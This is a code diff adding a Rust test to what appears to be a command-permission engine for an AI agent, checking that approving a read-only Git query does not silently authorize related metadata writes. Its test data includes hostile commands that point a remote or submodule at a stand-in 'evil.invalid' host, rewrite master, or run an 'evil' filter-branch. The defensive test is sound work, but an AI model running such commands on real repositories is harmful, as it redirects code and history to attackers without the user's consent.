@@ -184,6 +184,59 @@ fn paths_env_assignments_and_launchers_stay_exact() {
     }
 }
 
+// Catches: remembering a Git metadata query or mutation grants a prefix that
+// later redirects a remote, rewrites refs, adds worktrees or runs a new filter.
+#[test]
+fn remembered_git_control_subcommands_cannot_authorize_different_metadata_writes() {
+    let cases: Vec<(&[&str], &[&str])> = vec![
+        (
+            &["git", "remote", "get-url", "origin"],
+            &[
+                "git",
+                "remote",
+                "set-url",
+                "origin",
+                "https://evil.invalid/repo",
+            ],
+        ),
+        (
+            &["git", "update-ref", "refs/heads/topic", "HEAD"],
+            &["git", "update-ref", "refs/heads/master", "HEAD"],
+        ),
+        (
+            &["git", "worktree", "list"],
+            &["git", "worktree", "add", "/workspace/other"],
+        ),
+        (
+            &["git", "submodule", "status"],
+            &["git", "submodule", "add", "https://evil.invalid/repo"],
+        ),
+        (
+            &["git", "filter-branch", "--tree-filter", "true", "HEAD"],
+            &["git", "filter-branch", "--tree-filter", "evil", "HEAD"],
+        ),
+    ];
+    let mut failures = Vec::new();
+    for (original, later) in cases {
+        let mut rules = Ruleset::default();
+        for rule in suggested(&spawn(original)) {
+            Ruleset::merge(&mut rules.allow, rule, Source::User);
+        }
+        let engine = PolicyEngine::new(CanonPath::new(WORKSPACE), Mode::Default, rules);
+        if !matches!(
+            engine.classify(spawn(original)),
+            Classification::Settled(Ok(_))
+        ) || !matches!(engine.classify(spawn(later)), Classification::Ask(_))
+        {
+            failures.push((original, later));
+        }
+    }
+    assert!(
+        failures.is_empty(),
+        "remembered Git authority widened: {failures:?}"
+    );
+}
+
 /// Catches `write(<workspace>/**)` reaching the repository's own control
 /// files: `.git/hooks/*` runs on the next commit, `.git/config` can name a
 /// program, and `.ego` holds the policy that decides the next prompt.
